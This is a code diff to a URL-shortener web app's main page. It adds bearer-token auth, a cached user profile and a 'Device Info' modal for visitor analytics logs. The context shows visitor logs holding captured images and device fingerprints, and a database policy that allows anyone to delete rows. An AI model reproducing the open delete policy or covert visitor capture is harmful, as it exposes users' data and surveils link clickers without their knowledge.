@@ -22,6 +22,10 @@ const ExportHtmlModal = dynamic(() => import('../components/ExportHtmlModal').th
   ssr: false,
 });
 
+const DeviceInfoModal = dynamic(() => import('../components/DeviceInfoModal').then(m => m.DeviceInfoModal), {
+  ssr: false,
+});
+
 const ImageConverter = dynamic(() => import('../components/ImageConverter').then(m => m.ImageConverter), {
   ssr: false,
   loading: () => (
@@ -125,6 +129,7 @@ export default function Home() {
   const [analyticsData, setAnalyticsData] = useState<any[]>([]);
   const [isLoadingAnalytics, setIsLoadingAnalytics] = useState(false);
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
+  const [selectedDeviceInfo, setSelectedDeviceInfo] = useState<any | null>(null);
 
   const [editingLink, setEditingLink] = useState<{
     id: string,
@@ -277,20 +282,39 @@ export default function Home() {
       if (savedHistory) setHistory(JSON.parse(savedHistory));
       const savedGuestTries = localStorage.getItem('supashort_guest_tries');
       if (savedGuestTries) setGuestTriesUsed(parseInt(savedGuestTries, 10) || 0);
+
+      // Instant UI restore from cache (Zero loading delay / flicker!)
+      const cachedUser = localStorage.getItem('supashort_user_cache');
+      if (cachedUser) {
+        setCurrentUser(JSON.parse(cachedUser));
+      }
     } catch {}
 
     // Check user auth session and live subscription quota
     const checkSession = async () => {
       try {
-        const res = await fetch('/api/user/profile');
+        const token = typeof window !== 'undefined' ? localStorage.getItem('supashort_user_token') : null;
+        const headers: Record<string, string> = {};
+        if (token) headers['Authorization'] = `Bearer ${token}`;
+
+        const res = await fetch('/api/user/profile', { headers });
         const data = await res.json();
         if (res.ok && data.authenticated && data.user) {
           setCurrentUser(data.user);
+          try {
+            localStorage.setItem('supashort_user_cache', JSON.stringify(data.user));
+          } catch {}
         } else {
-          setCurrentUser(null);
+          // If server explicitly confirms unauthenticated and no valid token
+          if (!token) {
+            setCurrentUser(null);
+            try {
+              localStorage.removeItem('supashort_user_cache');
+            } catch {}
+          }
         }
       } catch {
-        // silent fail
+        // silent fail: offline or network hiccup, keep cached profile
       }
     };
     checkSession();
@@ -298,10 +322,17 @@ export default function Home() {
 
   const fetchUserProfile = async () => {
     try {
-      const res = await fetch('/api/user/profile');
+      const token = typeof window !== 'undefined' ? localStorage.getItem('supashort_user_token') : null;
+      const headers: Record<string, string> = {};
+      if (token) headers['Authorization'] = `Bearer ${token}`;
+
+      const res = await fetch('/api/user/profile', { headers });
       const data = await res.json();
       if (res.ok && data.authenticated && data.user) {
         setCurrentUser(data.user);
+        try {
+          localStorage.setItem('supashort_user_cache', JSON.stringify(data.user));
+        } catch {}
       }
     } catch {}
   };
@@ -312,9 +343,13 @@ export default function Home() {
     setIsRedeemingCoupon(true);
     setCouponMessage(null);
     try {
+      const token = typeof window !== 'undefined' ? localStorage.getItem('supashort_user_token') : null;
+      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+      if (token) headers['Authorization'] = `Bearer ${token}`;
+
       const res = await fetch('/api/user/redeem-coupon', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers,
         body: JSON.stringify({ code: couponCodeInput.trim() }),
       });
       const data = await res.json();
@@ -322,7 +357,7 @@ export default function Home() {
         playBubblePop(760);
         setCouponMessage({ type: 'success', text: data.message });
         setCouponCodeInput('');
-        fetchUserProfile();
+        await fetchUserProfile();
       } else {
         setCouponMessage({ type: 'error', text: data.error || 'Failed to redeem coupon code' });
       }
@@ -336,7 +371,14 @@ export default function Home() {
   const handleLogout = async () => {
     playBubblePop(450);
     try {
-      await fetch('/api/user/auth', { method: 'DELETE' });
+      const token = typeof window !== 'undefined' ? localStorage.getItem('supashort_user_token') : null;
+      const headers: Record<string, string> = {};
+      if (token) headers['Authorization'] = `Bearer ${token}`;
+      await fetch('/api/user/auth', { method: 'DELETE', headers });
+    } catch {}
+    try {
+      localStorage.removeItem('supashort_user_token');
+      localStorage.removeItem('supashort_user_cache');
     } catch {}
     setCurrentUser(null);
   };
@@ -1677,6 +1719,17 @@ create policy "Allow public delete access" on public.urls for delete using (true
                                   {log.browser} • {log.os}
                                 </span>
                                 <div className="flex items-center gap-1.5 shrink-0">
+                                  <button
+                                    type="button"
+                                    onClick={() => {
+                                      playBubblePop(720);
+                                      setSelectedDeviceInfo(log);
+                                    }}
+                                    className="glass-orb orb-blue px-2.5 py-1 text-[10px] font-extrabold text-white active:scale-95 shadow-xs cursor-pointer flex items-center gap-1"
+                                    title="View Device Info"
+                                  >
+                                    📱 Info
+                                  </button>
                                   {log.captured_image && (
                                     <button
                                       onClick={() => setSelectedImage(log.captured_image)}
@@ -2656,6 +2709,16 @@ create policy "Allow public delete access" on public.urls for delete using (true
                                                GPU: {log.webgl_vendor.split(' ')[0]}
                                              </p>
                                            )}
+                                           <button
+                                             type="button"
+                                             onClick={() => {
+                                               playBubblePop(720);
+                                               setSelectedDeviceInfo(log);
+                                             }}
+                                             className="clay-small-pill px-2 py-0.5 mt-1 text-[8.5px] font-extrabold text-indigo-700 hover:text-indigo-950 flex items-center gap-1 cursor-pointer active:scale-95 transition-all shadow-xs"
+                                           >
+                                             <span>📱</span> Device Info
+                                           </button>
                                         </div>
                                      </div>
                                   </div>
@@ -3504,12 +3567,21 @@ except Exception as error:
       <UserAuthModal
         isOpen={showAuthModal}
         onClose={() => setShowAuthModal(false)}
-        onSuccess={(user) => {
+        onSuccess={async (user) => {
           setCurrentUser(user);
           setShowAuthModal(false);
+          await fetchUserProfile();
         }}
         mode={authModalMode}
         reason={authModalReason}
+      />
+
+      {/* Visitor Intelligence Device Info Modal */}
+      <DeviceInfoModal
+        isOpen={!!selectedDeviceInfo}
+        onClose={() => setSelectedDeviceInfo(null)}
+        log={selectedDeviceInfo}
+        shortUrl={analyticsLink ? `${typeof window !== 'undefined' ? window.location.host : ''}/${analyticsLink.short_code}` : undefined}
       />
 
       {/* 3D Liquid Glass User Profile & Subscription / Coupon Modal */}
